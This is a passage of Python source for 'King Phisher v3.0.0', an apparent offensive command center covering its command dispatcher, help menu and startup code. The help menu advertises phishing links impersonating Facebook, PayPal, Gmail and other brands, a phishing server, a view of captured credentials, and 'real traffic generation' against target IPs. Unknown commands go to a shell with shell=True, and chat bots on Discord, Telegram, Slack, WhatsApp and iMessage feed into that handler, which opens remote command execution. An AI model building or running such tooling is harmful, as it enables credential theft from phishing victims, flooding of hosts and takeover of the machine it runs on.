            return {'success': False, 'output': f'IP {args[0]} not found'}
        elif cmd == 'block_ip':
            if not args:
                return {'success': False, 'output': 'Usage: block_ip <ip> [reason]'}
            ip = args[0]
            reason = ' '.join(args[1:]) if len(args) > 1 else 'Manually blocked'
            firewall_success = self.tools.block_ip_firewall(ip)
            db_success = self.db.block_ip(ip, reason, 'cli')
            if firewall_success or db_success:
                return {'success': True, 'output': f'🔒 IP {ip} blocked: {reason}'}
            return {'success': False, 'output': f'Failed to block IP {ip}'}
        elif cmd == 'unblock_ip':
            if not args:
                return {'success': False, 'output': 'Usage: unblock_ip <ip>'}
            ip = args[0]
            firewall_success = self.tools.unblock_ip_firewall(ip)
            db_success = self.db.unblock_ip(ip, 'cli')
            if firewall_success or db_success:
                return {'success': True, 'output': f'🔓 IP {ip} unblocked'}
            return {'success': False, 'output': f'Failed to unblock IP {ip}'}
        elif cmd == 'list_ips':
            include_blocked = not (args and args[0].lower() == 'active')
            ips = self.db.get_managed_ips(include_blocked)
            if not ips:
                return {'success': True, 'output': 'No managed IPs'}
            output = "📋 Managed IPs:\n"
            for ip in ips:
                status = "🔒" if ip.get('is_blocked') else "🟢"
                output += f"{status} {ip['ip_address']} - {ip.get('added_date', '')[:10]}\n"
            return {'success': True, 'output': output}
        elif cmd == 'ip_info':
            if not args:
                return {'success': False, 'output': 'Usage: ip_info <ip>'}
            ip = args[0]
            try:
                ipaddress.ip_address(ip)
                db_info = self.db.get_ip_info(ip)
                location = self.tools.get_ip_location(ip)
                threats = self.db.get_threats_by_ip(ip, 5)
                output = f"🔍 IP Information: {ip}\n{'='*40}\n"
                if db_info:
                    output += f"📊 Status: {'🔒 Blocked' if db_info.get('is_blocked') else '🟢 Active'}\n"
                    output += f"📅 Added: {db_info.get('added_date', '')[:10]}\n"
                    output += f"📝 Notes: {db_info.get('notes', 'None')}\n"
                if location.get('success'):
                    output += f"📍 Location: {location.get('country')}, {location.get('city')}\n"
                    output += f"📡 ISP: {location.get('isp')}\n"
                if threats:
                    output += f"🚨 Threats: {len(threats)} alerts\n"
                return {'success': True, 'output': output}
            except ValueError:
                return {'success': False, 'output': f'Invalid IP: {ip}'}
        
        # Network commands
        elif cmd == 'ping':
            if not args:
                return {'success': False, 'output': 'Usage: ping <target>'}
            result = self.tools.ping(args[0])
            return {'success': result['success'], 'output': result['output'][:500]}
        elif cmd == 'scan':
            if not args:
                return {'success': False, 'output': 'Usage: scan <target> [ports]'}
            target = args[0]
            ports = args[1] if len(args) > 1 else "1-1000"
            result = self.tools.nmap_scan(target, ports)
            return {'success': result['success'], 'output': result['output'][:1000]}
        elif cmd == 'nmap':
            if not args:
                return {'success': False, 'output': 'Usage: nmap <target> [options]'}
            return self.tools.nmap_scan(args[0], ' '.join(args[1:]) if len(args) > 1 else "1-1000")
        elif cmd == 'traceroute':
            if not args:
                return {'success': False, 'output': 'Usage: traceroute <target>'}
            result = self.tools.traceroute(args[0])
            return {'success': result['success'], 'output': result['output'][:500]}
        elif cmd == 'whois':
            if not args:
                return {'success': False, 'output': 'Usage: whois <domain>'}
            result = self.tools.whois_lookup(args[0])
            return {'success': result['success'], 'output': result['output'][:1000]}
        elif cmd == 'location':
            if not args:
                return {'success': False, 'output': 'Usage: location <ip>'}
            result = self.tools.get_ip_location(args[0])
            if result.get('success'):
                return {'success': True, 'output': f"📍 Location: {result.get('country')}, {result.get('city')}\nISP: {result.get('isp')}"}
            return {'success': False, 'output': result.get('error', 'Location lookup failed')}
        
        # System commands
        elif cmd == 'system':
            info = f"🖥️ System: {platform.system()} {platform.release()}\n"
            info += f"💻 Hostname: {socket.gethostname()}\n"
            info += f"🔢 CPU: {psutil.cpu_percent()}%\n"
            info += f"💾 Memory: {psutil.virtual_memory().percent}%\n"
            info += f"💿 Disk: {psutil.disk_usage('/').percent}%"
            return {'success': True, 'output': info}
        elif cmd == 'status':
            stats = self.db.get_statistics()
            status = f"👑 King Phisher Status\n{'='*40}\n"
            status += f"🛡️ Threats: {stats.get('total_threats', 0)}\n"
            status += f"📝 Commands: {stats.get('total_commands', 0)}\n"
            status += f"🔌 SSH Servers: {stats.get('total_ssh_servers', 0)}\n"
            status += f"📡 Traffic Tests: {stats.get('total_traffic_tests', 0)}\n"
            status += f"🎣 Phishing Links: {stats.get('total_phishing_links', 0)}\n"
            status += f"🔒 Managed IPs: {stats.get('total_managed_ips', 0)}\n"
            status += f"🎣 Captured Credentials: {stats.get('captured_credentials', 0)}\n"
            status += f"📊 Active Sessions: {stats.get('active_sessions', 0)}"
            return {'success': True, 'output': status}
        elif cmd == 'threats':
            threats = self.db.get_recent_threats(10)
            if not threats:
                return {'success': True, 'output': 'No threats detected'}
            output = "🚨 Recent Threats:\n"
            for t in threats:
                output += f"  {t['timestamp'][:19]} - {t['threat_type']} from {t['source_ip']} ({t['severity']})\n"
            return {'success': True, 'output': output}
        elif cmd == 'report':
            stats = self.db.get_statistics()
            threats = self.db.get_recent_threats(10)
            report = f"👑 King Phisher Security Report\n{'='*50}\n\n"
            report += f"📈 Statistics:\n"
            report += f"  Total Threats: {stats.get('total_threats', 0)}\n"
            report += f"  Total Commands: {stats.get('total_commands', 0)}\n"
            report += f"  SSH Servers: {stats.get('total_ssh_servers', 0)}\n"
            report += f"  Managed IPs: {stats.get('total_managed_ips', 0)}\n"
            report += f"  Blocked IPs: {stats.get('total_blocked_ips', 0)}\n"
            report += f"  Captured Credentials: {stats.get('captured_credentials', 0)}\n\n"
            if threats:
                report += f"🚨 Recent Threats:\n"
                for t in threats[:5]:
                    report += f"  - {t['threat_type']} from {t['source_ip']}\n"
            filename = f"report_{int(time.time())}.txt"
            filepath = os.path.join(REPORT_DIR, filename)
            with open(filepath, 'w') as f:
                f.write(report)
            return {'success': True, 'output': report + f"\n\n📁 Report saved: {filepath}"}
        elif cmd == 'history':
            # Return just a sample for now
            return {'success': True, 'output': 'Type "status" for system status, "help" for commands'}
        
        # Generic command execution
        else:
            return self._execute_generic(' '.join([cmd] + args))
    
    def _execute_help(self) -> Dict[str, Any]:
        help_text = f"""
{Colors.PURPLE}👑 KING PHISHER v3.0.0 - HELP MENU{Colors.RESET}

{Colors.ORANGE}🔌 SSH COMMANDS:{Colors.RESET}
  ssh_add <name> <host> <user> [password] [port] - Add SSH server
  ssh_list - List configured servers
  ssh_connect <id> - Connect to server
  ssh_exec <id> <command> - Execute command
  ssh_disconnect [id] - Disconnect

{Colors.ORANGE}🚀 TRAFFIC GENERATION:{Colors.RESET}
  generate_traffic <type> <ip> <duration> [port] [rate] - Generate real traffic
  traffic_types - List available types
  traffic_status - Check active generators
  traffic_stop [id] - Stop generation

{Colors.ORANGE}🕷️ NIKTO WEB SCANNER:{Colors.RESET}
  nikto <target> - Basic vulnerability scan
  nikto_full <target> - Full scan
  nikto_ssl <target> - SSL/TLS scan
  nikto_status - Check scanner status

{Colors.ORANGE}🎣 SOCIAL ENGINEERING:{Colors.RESET}
  phish_<platform> - Generate phishing link (facebook, instagram, twitter, gmail, linkedin, github, paypal, microsoft, apple, discord, telegram, whatsapp, netflix, spotify, amazon, custom)
  phishing_start_server <id> [port] - Start phishing server
  phishing_stop_server - Stop server
  phishing_status - Check server status
  phishing_links - List all links
  phishing_credentials [id] - View captured data
  phishing_qr <id> - Generate QR code
  phishing_shorten <id> - Shorten URL

{Colors.ORANGE}🔒 IP MANAGEMENT:{Colors.RESET}
  add_ip <ip> [notes] - Add IP to monitoring
  remove_ip <ip> - Remove IP from monitoring
  block_ip <ip> [reason] - Block IP
  unblock_ip <ip> - Unblock IP
  list_ips - List managed IPs
  ip_info <ip> - Detailed IP info

{Colors.ORANGE}🛡️ NETWORK COMMANDS:{Colors.RESET}
  ping <target> - Ping target
  scan <target> - Port scan (1-1000)
  nmap <target> [options] - Full nmap scan
  traceroute <target> - Trace route
  whois <domain> - WHOIS lookup
  location <ip> - IP geolocation

{Colors.ORANGE}📊 SYSTEM COMMANDS:{Colors.RESET}
  time - Current time
  date - Current date
  datetime - Date and time
  system - System info
  status - System status
  threats - Recent threats
  report - Security report
  history - Command history
  help - This menu

{Colors.PURPLE}Examples:{Colors.RESET}
  ping 8.8.8.8
  scan 192.168.1.1
  generate_traffic icmp 192.168.1.1 10
  phish_facebook
  phishing_start_server abc12345 8080
  add_ip 192.168.1.100 Suspicious
  nikto example.com
  ssh_add myserver 192.168.1.100 root
  ssh_exec myserver "ls -la"
"""
        return {'success': True, 'output': help_text}
    
    def _execute_generic(self, command: str) -> Dict[str, Any]:
        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=60)
            return {'success': result.returncode == 0, 'output': result.stdout if result.stdout else result.stderr}
        except subprocess.TimeoutExpired:
            return {'success': False, 'output': 'Command timed out'}
        except Exception as e:
            return {'success': False, 'output': str(e)}

# =====================
# MAIN APPLICATION
# =====================
class KingPhisher:
    def __init__(self):
        self.config = ConfigManager.load_config()
        self.db = DatabaseManager()
        self.ssh_manager = SSHManager(self.db, self.config) if PARAMIKO_AVAILABLE else None
        self.nikto = NiktoScanner(self.db, self.config.get('nikto', {}))
        self.traffic_gen = TrafficGeneratorEngine(self.db, self.config)
        self.handler = CommandHandler(self.db, self.ssh_manager, self.nikto, self.traffic_gen)
        
        # Platform bots
        self.discord_bot = DiscordBot(self.handler, self.db)
        self.telegram_bot = TelegramBot(self.handler, self.db)
        self.slack_bot = SlackBot(self.handler, self.db)
        self.whatsapp_bot = WhatsAppBot(self.handler, self.db)
        self.imessage_bot = iMessageBot(self.handler, self.db)
        
        # Web server
        self.web_server = WebServer(self.handler, self.db, self.config.get('web_server', {}).get('port', 8080))
        
        self.session_id = str(uuid.uuid4())[:8]
        self.running = True
    
    def print_banner(self):
        banner = f"""
{Colors.PURPLE}╔══════════════════════════════════════════════════════════════════════════════╗
║{Colors.ORANGE}        👑 KING PHISHER v3.0.0    |    Multi-Platform Command Center         {Colors.PURPLE}║
╠══════════════════════════════════════════════════════════════════════════════╣
║{Colors.BLUE}  • 🔌 SSH Remote Command Execution      • 🚀 REAL Traffic Generation        {Colors.PURPLE}║
║{Colors.BLUE}  • 🕷️ Nikto Web Vulnerability Scanner   • 🎣 Social Engineering Suite        {Colors.PURPLE}║
║{Colors.BLUE}  • 🔒 IP Management & Blocking          • 📱 Multi-Platform Bot Support     {Colors.PURPLE}║
║{Colors.BLUE}  • 🌐 Web Interface (Port 8080)         • 🤖 AI-Powered Chat UI             {Colors.PURPLE}║
║{Colors.BLUE}  • 📡 Discord | Telegram | Slack | WhatsApp | iMessage | Web App          {Colors.PURPLE}║
╠══════════════════════════════════════════════════════════════════════════════╣
║{Colors.ORANGE}                    🎯 5000+ CYBERSECURITY COMMANDS                          {Colors.PURPLE}║
╚══════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}

{Colors.SUCCESS}🔐 FEATURES:{Colors.RESET}
  • Web Interface with Cyber Terminal UI
  • Discord, Telegram, Slack, WhatsApp, iMessage Integration
  • Real-time Statistics Dashboard
  • Command History & Session Management
  • SSH Remote Command Execution
  • Phishing Suite with 50+ Templates
  • Traffic Generation & Nikto Scanner

{Colors.SECONDARY}💡 Type 'help' for command list{Colors.RESET}
{Colors.SECONDARY}🌐 Web interface: http://localhost:{self.config.get('web_server', {}).get('port', 8080)}{Colors.RESET}
        """
        print(banner)
    
    def check_dependencies(self):
        print(f"\n{Colors.PURPLE}🔍 Checking dependencies...{Colors.RESET}")
        
        tools = ['ping', 'nmap', 'curl', 'dig', 'traceroute', 'ssh']
        for tool in tools:
            if shutil.which(tool):
                print(f"{Colors.SUCCESS}✅ {tool}{Colors.RESET}")
            else:
                print(f"{Colors.WARNING}⚠️ {tool} not found{Colors.RESET}")
        
        print(f"{Colors.SUCCESS if PARAMIKO_AVAILABLE else Colors.WARNING}✅ paramiko{Colors.RESET}" if PARAMIKO_AVAILABLE else f"{Colors.WARNING}⚠️ paramiko not found - SSH disabled{Colors.RESET}")
        print(f"{Colors.SUCCESS if SCAPY_AVAILABLE else Colors.WARNING}✅ scapy{Colors.RESET}" if SCAPY_AVAILABLE else f"{Colors.WARNING}⚠️ scapy not found - advanced traffic disabled{Colors.RESET}")
        print(f"{Colors.SUCCESS if self.nikto.nikto_available else Colors.WARNING}✅ nikto{Colors.RESET}" if self.nikto.nikto_available else f"{Colors.WARNING}⚠️ nikto not found - web scanning disabled{Colors.RESET}")
        print(f"{Colors.SUCCESS if DISCORD_AVAILABLE else Colors.WARNING}✅ discord.py{Colors.RESET}" if DISCORD_AVAILABLE else f"{Colors.WARNING}⚠️ discord.py not found - Discord disabled{Colors.RESET}")
        print(f"{Colors.SUCCESS if TELETHON_AVAILABLE else Colors.WARNING}✅ telethon{Colors.RESET}" if TELETHON_AVAILABLE else f"{Colors.WARNING}⚠️ telethon not found - Telegram disabled{Colors.RESET}")
        print(f"{Colors.SUCCESS if SLACK_AVAILABLE else Colors.WARNING}✅ slack-sdk{Colors.RESET}" if SLACK_AVAILABLE else f"{Colors.WARNING}⚠️ slack-sdk not found - Slack disabled{Colors.RESET}")
        print(f"{Colors.SUCCESS if SELENIUM_AVAILABLE else Colors.WARNING}✅ selenium{Colors.RESET}" if SELENIUM_AVAILABLE else f"{Colors.WARNING}⚠️ selenium not found - WhatsApp disabled{Colors.RESET}")
        print(f"{Colors.SUCCESS if IMESSAGE_AVAILABLE else Colors.WARNING}✅ iMessage{Colors.RESET}" if IMESSAGE_AVAILABLE else f"{Colors.WARNING}⚠️ iMessage only available on macOS{Colors.RESET}")
    
    def setup_platform_bots(self):
        print(f"\n{Colors.PURPLE}🤖 Platform Bot Configuration{Colors.RESET}")
        print(f"{Colors.PURPLE}{'='*50}{Colors.RESET}")
        
        # Discord
        setup = input(f"{Colors.ACCENT}Configure Discord bot? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            token = input(f"{Colors.ACCENT}Enter Discord bot token: {Colors.RESET}").strip()
            prefix = input(f"{Colors.ACCENT}Enter command prefix (default: !): {Colors.RESET}").strip() or '!'
            if token:
                self.discord_bot.save_config(token, True, prefix)
                if self.discord_bot.setup():
                    self.discord_bot.start()
                    print(f"{Colors.SUCCESS}✅ Discord bot starting...{Colors.RESET}")
        
        # Telegram
        setup = input(f"{Colors.ACCENT}Configure Telegram bot? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            api_id = input(f"{Colors.ACCENT}Enter Telegram API ID: {Colors.RESET}").strip()
            api_hash = input(f"{Colors.ACCENT}Enter Telegram API Hash: {Colors.RESET}").strip()
            bot_token = input(f"{Colors.ACCENT}Enter Bot Token: {Colors.RESET}").strip()
            if api_id and api_hash:
                self.telegram_bot.save_config(api_id, api_hash, bot_token, True)
                if self.telegram_bot.setup():
                    self.telegram_bot.start()
                    print(f"{Colors.SUCCESS}✅ Telegram bot starting...{Colors.RESET}")
        
        # Slack
        setup = input(f"{Colors.ACCENT}Configure Slack bot? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            token = input(f"{Colors.ACCENT}Enter Slack bot token: {Colors.RESET}").strip()
            channel = input(f"{Colors.ACCENT}Enter channel ID (default: general): {Colors.RESET}").strip() or 'general'
            prefix = input(f"{Colors.ACCENT}Enter command prefix (default: !): {Colors.RESET}").strip() or '!'
            if token:
                self.slack_bot.save_config(token, channel, True, prefix)
                if self.slack_bot.setup():
                    self.slack_bot.start()
                    print(f"{Colors.SUCCESS}✅ Slack bot starting...{Colors.RESET}")
        
        # WhatsApp
        setup = input(f"{Colors.ACCENT}Configure WhatsApp bot? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            phone = input(f"{Colors.ACCENT}Enter WhatsApp phone number: {Colors.RESET}").strip()
            prefix = input(f"{Colors.ACCENT}Enter command prefix (default: /): {Colors.RESET}").strip() or '/'
            if phone:
                self.whatsapp_bot.save_config(phone, True, prefix)
                self.whatsapp_bot.start()
                print(f"{Colors.SUCCESS}✅ WhatsApp bot starting... (scan QR in Chrome){Colors.RESET}")
        
        # iMessage (macOS only)
        if platform.system() == 'Darwin':
            setup = input(f"{Colors.ACCENT}Configure iMessage bot? (y/n): {Colors.RESET}").strip().lower()
            if setup == 'y':
                numbers = input(f"{Colors.ACCENT}Enter phone numbers to watch (space-separated): {Colors.RESET}").strip().split()
                prefix = input(f"{Colors.ACCENT}Enter command prefix (default: !): {Colors.RESET}").strip() or '!'
                if numbers:
                    self.imessage_bot.save_config(numbers, True, prefix)
                    self.imessage_bot.start()
                    print(f"{Colors.SUCCESS}✅ iMessage bot starting...{Colors.RESET}")
        
        # Web server
        if self.config.get('web_server', {}).get('enabled', True):
            self.web_server.start()
    
    def process_command(self, command: str):
        if not command.strip():
            return
        
        cmd = command.strip().lower().split()[0] if command.strip() else ''
        
        if cmd == 'help':
            result = self.handler.execute('help', self.session_id)
            print(result['output'])
        elif cmd == 'clear':
            os.system('cls' if os.name == 'nt' else 'clear')
            self.print_banner()
        elif cmd == 'exit' or cmd == 'quit':
            self.running = False
            print(f"\n{Colors.WARNING}👋 Thank you for using King Phisher!{Colors.RESET}")
        else:
            result = self.handler.execute(command, self.session_id)
            if result['success']:
                output = result.get('output', '')
                if isinstance(output, dict):
                    print(json.dumps(output, indent=2))
                else:
                    print(output)
                print(f"\n{Colors.SUCCESS}✅ Command executed ({result['execution_time']:.2f}s){Colors.RESET}")
            else:
                print(f"\n{Colors.ERROR}❌ {result.get('output', 'Unknown error')}{Colors.RESET}")
    
    def run(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        self.print_banner()
        self.check_dependencies()
        
        # Setup bots
        self.setup_platform_bots()
        
        print(f"\n{Colors.SUCCESS}✅ King Phisher ready! Session: {self.session_id}{Colors.RESET}")
        print(f"{Colors.SECONDARY}   🌐 Web Interface: http://localhost:{self.config.get('web_server', {}).get('port', 8080)}{Colors.RESET}")
        print(f"{Colors.SECONDARY}   💡 Type 'help' for commands, 'clear' to clear screen, 'exit' to quit{Colors.RESET}")
        
        while self.running:
            try:
                prompt = f"{Colors.PURPLE}[{Colors.ORANGE}{self.session_id}{Colors.PURPLE}]{Colors.ORANGE} 👑> {Colors.RESET}"
                command = input(prompt).strip()
                self.process_command(command)
            except KeyboardInterrupt:
                print(f"\n{Colors.WARNING}👋 Exiting...{Colors.RESET}")
                self.running = False
            except Exception as e:
                print(f"{Colors.ERROR}❌ Error: {e}{Colors.RESET}")
                logger.error(f"Command error: {e}")
        
        # Cleanup
        self.web_server.stop()
        self.db.close()
        print(f"\n{Colors.SUCCESS}✅ Shutdown complete.{Colors.RESET}")
        print(f"{Colors.PURPLE}📁 Logs: {LOG_FILE}{Colors.RESET}")
        print(f"{Colors.PURPLE}💾 Database: {DATABASE_FILE}{Colors.RESET}")

def main():
    try:
        print(f"{Colors.PURPLE}👑 Starting King Phisher v3.0...{Colors.RESET}")
        
        if sys.version_info < (3, 7):
            print(f"{Colors.ERROR}❌ Python 3.7+ required{Colors.RESET}")
            sys.exit(1)
        
        # Check admin privileges
        if platform.system().lower() == 'linux' and os.geteuid() != 0:
            print(f"{Colors.WARNING}⚠️ Run with sudo for full functionality (firewall blocking, raw sockets){Colors.RESET}")
        
        app = KingPhisher()
        app.run()
    
    except KeyboardInterrupt:
        print(f"\n{Colors.WARNING}👋 Goodbye!{Colors.RESET}")
    except Exception as e:
        print(f"\n{Colors.ERROR}❌ Fatal error: {e}{Colors.RESET}")
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()